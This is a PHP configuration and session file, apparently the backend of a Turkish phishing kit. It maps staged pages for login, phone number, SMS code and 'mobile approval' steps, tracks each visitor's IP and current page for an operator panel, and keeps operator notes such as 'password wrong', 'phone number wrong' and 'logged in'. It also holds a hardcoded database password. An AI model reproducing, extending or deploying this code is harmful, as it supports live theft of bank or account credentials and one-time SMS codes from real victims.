<?php
// Plesk direct connection configuration
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// Vercel session configuration
if (getenv('VERCEL') == '1' || is_writable('/tmp')) {
    session_save_path('/tmp');
}
session_start();
ob_start();
date_default_timezone_set('Europe/Istanbul');

// Detect if running on Vercel serverless environment
if (getenv('VERCEL') == '1' || isset($_SERVER['VERCEL'])) {
    // Vercel Remote Connection via Config/Environment Variables
    require_once 'config.php';
    
    $realDbConnection = null;
    function getDbConnection() {
        global $realDbConnection;
        if ($realDbConnection !== null) {
            return $realDbConnection;
        }
        try {
            $realDbConnection = new PDO("mysql:host=" . DB_HOST . ";port=" . DB_PORT . ";dbname=" . DB_NAME . ";charset=utf8", DB_USER, DB_PASS);
            $realDbConnection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); 
        } catch (PDOException $e) {
            $realDbConnection = false;
        }
        return $realDbConnection;
    }

    class PDOProxy {
        private $realPDO = null;
        
        private function getPDO() {
            if ($this->realPDO === null) {
                $realPDOConn = getDbConnection();
                if (!$realPDOConn) {
                    die("Veritabanı bağlantı hatası! Lütfen Vercel panelinden Environment Variables (ortam değişkenlerini) doğru tanımladığınızdan emin olun.");
                }
                $this->realPDO = $realPDOConn;
            }
            return $this->realPDO;
        }
        
        public function prepare($query, $options = []) {
            return $this->getPDO()->prepare($query, $options);
        }
        
        public function query($query, ...$args) {
            if (empty($args)) {
                return $this->getPDO()->query($query);
            }
            return $this->getPDO()->query($query, ...$args);
        }
        
        public function exec($statement) {
            return $this->getPDO()->exec($statement);
        }
        
        public function lastInsertId($name = null) {
            return $this->getPDO()->lastInsertId($name);
        }
        
        public function __call($name, $arguments) {
            return call_user_func_array([$this->getPDO(), $name], $arguments);
        }
    }

    $db = new PDOProxy();
} else {
    // Plesk Local Database Connection
    $db = new PDO("mysql:host=localhost;dbname=wafawef;charset=utf8", "wearawer", "V^hdDdc8$0t6wrYt");
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); 
}
 
require_once 'AjaxClass.php';

$ajax = new Ajax($db);

DEFINE('IP', $ajax->getIP());
DEFINE('BAN_URL',"https://www.youtube.com/watch?v=S1mbxjBTiIE");

$script = basename($_SERVER['SCRIPT_NAME']);
$pageMap = [
    'giris.php' => 'Giriş Sayfası',
    'telefon.php' => 'Telefon Numara Girişi',
    'bekle.php' => 'Bekle',
    'sms.php' => 'SMS',
    'mobil-onay.php' => 'Mobil-Onay',
    'hatali-sms.php' => 'Hatalı SMS',
    'hatali.php' => 'Şifre Hata',
    'basarili.php' => 'Başarılı',
    'ping.php' => 'Giriş Sayfası'
];
$currentPage = isset($pageMap[$script]) ? $pageMap[$script] : 'Anasayfa';

// Skip online updates for Plesk panel requests to avoid corrupting visitor online metrics
if (strpos($_SERVER['SCRIPT_NAME'], '/gmypanel/') === false && strpos($_SERVER['SCRIPT_NAME'], '/gmypanel-plesk/') === false) {
    if ($script === 'check_redirect.php') {
        $ajax->updateOnlineTimestampOnly(IP);
    } else {
        $ajax->updateOnline(IP, $currentPage);
    }
}

$session = @$_SESSION['loggedIn'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$acsTime = date('d.m.20y, H:i');

function parseNote($note) {
    $note = trim($note);
    if (empty($note)) {
        return ['selected' => '', 'manual' => ''];
    }
    $decoded = json_decode($note, true);
    if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
        return [
            'selected' => isset($decoded['selected']) ? $decoded['selected'] : '',
            'manual' => isset($decoded['manual']) ? $decoded['manual'] : ''
        ];
    }
    
    // Fallback for legacy plain text notes
    $options = ["Bildirim vermedi", "Şifre hatalı", "Tel no hatalı", "Bırçi", "Giriş Yapıldı"];
    if (in_array($note, $options)) {
        return ['selected' => $note, 'manual' => ''];
    }
    return ['selected' => '', 'manual' => $note];
}

